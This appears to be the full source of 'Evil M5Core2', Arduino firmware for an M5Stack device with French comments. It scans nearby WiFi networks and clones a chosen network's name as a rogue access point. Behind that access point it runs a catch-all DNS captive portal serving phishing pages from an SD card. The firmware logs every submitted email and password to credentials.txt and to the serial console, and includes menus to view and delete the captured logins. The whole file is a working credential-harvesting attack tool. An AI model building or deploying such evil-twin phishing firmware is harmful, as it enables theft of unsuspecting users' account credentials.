#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials" };
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "";  // Pour stocker le SSID cloné


String portalFiles[10]; // Supposons que vous avez au maximum 10 fichiers
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // portail par défaut
int portalFileIndex = 0; // Index du fichier actuellement sélectionné


void setup() {
  M5.begin();

  // Configurer la taille, la couleur et la police du texte
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);

  // Positionner et afficher le texte
  int textY = 80;
  int lineOffset = 10; // Espace entre le texte et la ligne
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30; // Hauteur de la police x2 + espace

  // Dessiner les lignes
  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  // Afficher le texte
  M5.Display.setCursor(85, textY);
  M5.Display.println(" Evil M5Core2");
  M5.Display.setCursor(80, textY + 20);
  M5.Display.println("By 7h30th3r0n3");
  // Ajouter un délai avant de passer à la suite du programme
  fistScanWifiNetworks();
  if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
    Serial.println("Erreur d'initialisation de la carte SD");
    return;
  }
  Serial.println("Carte SD initialisée avec succès");

}

void fistScanWifiNetworks() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    unsigned long startTime = millis();
    int n;
    while (millis() - startTime < 5000) {
        n = WiFi.scanNetworks();
        if (n != WIFI_SCAN_RUNNING) break;
    }

    if (n == 0) {
        Serial.println("Aucun réseau trouvé");
    } else {
        Serial.print(n);
        Serial.println(" réseaux trouvés");
        numSsid = min(n, 100); // Limiter le nombre de SSID à 30
        for (int i = 0; i < numSsid; i++) {
            ssidList[i] = WiFi.SSID(i);
            Serial.println(ssidList[i]); // Afficher les SSID trouvés dans le moniteur série
        }
    }
}

void loop() {
  M5.update();

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    if (isOperationInProgress) {
      drawInProgressAnimation();
    }
    if (M5.BtnB.wasPressed()) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }

  dnsServer.processNextRequest();
  server.handleClient();
}

void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex); // Afficher les détails pour le réseau sélectionné
      break;
    case 3:
      createCaptivePortal();
      break;
    case 4:
      stopCaptivePortal();
      break;
    case 5:
      changePortal();
      break;
    case 6:
      checkCredentials();
      break;
    case 7:
      deleteCredentials();
      break;
  }
  isOperationInProgress = false;
}
void handleMenuInput() {
  if (M5.BtnA.wasPressed()) {
    currentIndex = max(0, currentIndex - 1);
  } else if (M5.BtnC.wasPressed()) {
    currentIndex = min(menuSize - 1, currentIndex + 1);
  } else if (M5.BtnB.wasPressed()) {
    executeMenuItem(currentIndex);
  }
}

void drawMenu() {
    M5.Display.clear();
    M5.Display.setTextSize(2); // Taille du texte agrandie
    M5.Display.setTextFont(1);

    int lineHeight = 24; // Ajusté pour la nouvelle taille du texte
    int startX = 10;
    int startY = 25;

    for (int i = 0; i < menuSize; i++) {
        if (i == currentIndex) {
            // Ajuster le remplissage pour correspondre à la taille du texte
            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        // Centrer le texte dans la zone grisée
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
        M5.Display.println(menuItems[i]);
    }
    M5.Display.display();
}


void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    drawInProgressAnimation();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
  }
  waitAndReturnToMenu("Scan Completed");
}


void showWifiList() {
  const int listDisplayLimit = M5.Display.height() / 18; // Calcul du nombre de lignes affichables
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
  
  M5.Display.clear();
  M5.Display.setTextSize(2);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit); i++) {
    if (i == currentListIndex) {
      M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, 25 + (i - listStartIndex) * 18);
    M5.Display.println(ssidList[i]);
  }
  M5.Display.display();

  while (!inMenu) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      currentListIndex = max(0, currentListIndex - 1);
      showWifiList(); // Rafraîchir l'affichage
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex = min(numSsid - 1, currentListIndex + 1);
      showWifiList(); // Rafraîchir l'affichage
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
    }
  }
}



void showWifiDetails(int networkIndex) {
  if (networkIndex >= 0 && networkIndex < numSsid) {
    M5.Display.clear();
    M5.Display.setTextSize(2); // Taille de texte réduite pour plus d'informations
    int y = 10; // Position de départ en Y

    // Afficher le SSID
    M5.Display.setCursor(10, y);
    M5.Display.println("SSID: " + ssidList[networkIndex]);
    y += 40;
    
    M5.Display.setCursor(10, y);
    M5.Display.println("Channel: " + String(WiFi.channel(networkIndex)));
    y += 20;
    
    // Afficher la sécurité
    M5.Display.setCursor(10, y);
    String security = getWifiSecurity(networkIndex);
    M5.Display.println("Security: " + security);
    y += 20;

    // Afficher la puissance du signal
    M5.Display.setCursor(10, y);
    int32_t rssi = WiFi.RSSI(networkIndex);
    M5.Display.println("Signal: " + String(rssi) + " dBm");
    y += 20;

    // Afficher l'adresse MAC
    M5.Display.setCursor(10, y);
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    String macAddress = bssidToString(bssid);
    M5.Display.println("MAC: " + macAddress);
    y += 20;
    
    M5.Display.setCursor(230, 220);
    M5.Display.println("Clone");
    M5.Display.setCursor(140, 220);
    M5.Display.println("Back");
    
    M5.Display.display();

    // Attente de l'interaction de l'utilisateur
    while (!inMenu) {
      M5.update();
      if (M5.BtnC.wasPressed()) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        drawMenu();  // Redessiner le menu après l'opération
      } else if (M5.BtnB.wasPressed()) {
        inMenu = true;
        waitAndReturnToMenu(" Back to menu");
        drawMenu();  // Redessiner le menu après l'opération

      }
    }
  }
}

String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
    String ssid = clonedSSID.isEmpty() ? "FreeWifi" : clonedSSID;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(clonedSSID.c_str());
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

    server.on("/", HTTP_GET, []() {
        String email = server.arg("email");
        String password = server.arg("password");
        if (!email.isEmpty() && !password.isEmpty()) {
            saveCredentials(email, password);
            server.send(200, "text/plain", "Credentials Saved");
        } else {
            servePortalFile(selectedPortalFile);
        }
    });

    server.onNotFound([]() {
        servePortalFile(selectedPortalFile); // Ou toute autre logique nécessaire
    });

    server.begin();
    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
}

void servePortalFile(const String& filename) {
    File webFile = SD.open(filename);
    if (webFile) {
        server.streamFile(webFile, "text/html");
        webFile.close();
    } else {
        server.send(404, "text/plain", "File not found");
    }
}

void saveCredentials(const String& email, const String& password) {
    File file = SD.open("/credentials.txt", FILE_APPEND);
    if (file) {
        file.println("Email: " + email);
        file.println("Password: " + password);
        file.println("----------------------");
        file.close();
        Serial.println("Credentials " + email + ":" + password + "saved");
    } else {
        Serial.println("Error opening file for writing");
    }
}
void stopCaptivePortal() {
  // Arrête le serveur DNS et le serveur web
  dnsServer.stop();
  server.stop();

  // Désactive le point d'accès WiFi
  WiFi.softAPdisconnect(true);

  // Remet l'appareil en mode station pour permettre la connexion à un réseau WiFi existant
  WiFi.mode(WIFI_STA);

  // Message de confirmation et retour au menu
  waitAndReturnToMenu("  Portal Stopped");
}


// Déclaration globale
String credentialsList[30]; // Supposons que vous avez au maximum 30 lignes
int numCredentials = 0; // Nombre de lignes dans le fichier

void readCredentialsFromFile() {
    File file = SD.open("/credentials.txt");
    if (file) {
        numCredentials = 0;
        while (file.available() && numCredentials < 30) {
            credentialsList[numCredentials++] = file.readStringUntil('\n');
        }
        file.close();
    } else {
        Serial.println("Error opening file");
    }
}


void listPortalFiles() {
    File root = SD.open("/sites");
    numPortalFiles = 0;
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            portalFiles[numPortalFiles++] = String("/sites/") + file.name();
            if (numPortalFiles >= 10) break;
        }
        file.close();
    }
    root.close();
}

void changePortal() {
    listPortalFiles();
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(10, 10);
    M5.Display.println("Select Portal:");
    
    for (int i = 0; i < numPortalFiles; i++) {
        M5.Display.setCursor(10, 30 + i * 20);
        if (i == portalFileIndex) {
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        // Afficher uniquement le nom de fichier pour la lisibilité
        M5.Display.println(portalFiles[i].substring(7)); // Supprimer '/sites/' du nom affiché
    }
    M5.Display.display();
    
    while (!inMenu) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            portalFileIndex = max(0, portalFileIndex - 1);
            changePortal();
        } else if (M5.BtnC.wasPressed()) {
            portalFileIndex = min(numPortalFiles - 1, portalFileIndex + 1);
            changePortal();
        } else if (M5.BtnB.wasPressed()) {
            selectedPortalFile = portalFiles[portalFileIndex];
            inMenu = true;
            waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected"); // Supprimer '/sites/' du nom affiché
        }
    }
}


void checkCredentials() {
    readCredentialsFromFile();
    const int listDisplayLimit = M5.Display.height() / 18;
    int listStartIndex = max(0, min(currentListIndex, numCredentials - listDisplayLimit));
    
    M5.Display.clear();
    M5.Display.setTextSize(2);
    for (int i = listStartIndex; i < min(numCredentials, listStartIndex + listDisplayLimit); i++) {
        if (i == currentListIndex) {
            M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(10, 25 + (i - listStartIndex) * 18);
        M5.Display.println(credentialsList[i]);
    }
    M5.Display.display();

    while (!inMenu) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            currentListIndex = max(0, currentListIndex - 1);
            checkCredentials();
        } else if (M5.BtnC.wasPressed()) {
            currentListIndex = min(numCredentials - 1, currentListIndex + 1);
            checkCredentials();
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true;
            drawMenu();  // Redessiner le menu après l'opération

        }
    }
}

void deleteCredentials() {
    // Ouvrir le fichier en mode écriture pour effacer son contenu
    File file = SD.open("/credentials.txt", FILE_WRITE);
    if (file) {
        // Fermer le fichier pour sauvegarder le contenu vide
        file.close();
        // Afficher le message de confirmation
        waitAndReturnToMenu("Deleted successfully");
        Serial.println("Credentials deleted successfully");
    } else {
        // Afficher un message d'erreur
        waitAndReturnToMenu("Error..");
        Serial.println("Error opening file for deletion");
    }
}


void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
  M5.Display.println(message);
  M5.Display.display();
  delay(1000);
  inMenu = true;
  drawMenu();  // Redessiner le menu après l'opération
}

void drawInProgressAnimation() {
  M5.Display.clear();
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
  M5.Display.print("Scan in progress... ");
  M5.Display.display();
}
